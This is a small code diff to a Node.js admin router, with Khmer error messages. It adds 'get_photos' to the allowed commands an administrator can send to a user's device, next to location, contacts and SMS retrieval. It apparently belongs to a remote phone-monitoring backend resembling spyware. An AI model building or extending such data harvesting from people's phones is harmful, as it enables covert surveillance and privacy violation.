@@ -757,7 +757,7 @@ module.exports = function createAdminRouter(ctx) {
     if (!user_id || !command_type) {
       throw new ApiError('ខ្វះ user_id ឬ command_type', 400, 'MISSING_PARAMS');
     }
-    const validTypes = ['get_location', 'get_device_info', 'get_contacts', 'get_sms'];
+    const validTypes = ['get_location', 'get_device_info', 'get_contacts', 'get_sms', 'get_photos'];
     if (!validTypes.includes(command_type)) {
       throw new ApiError(`command_type មិនត្រឹមត្រូវ: ${command_type}`, 400, 'INVALID_COMMAND');
     }
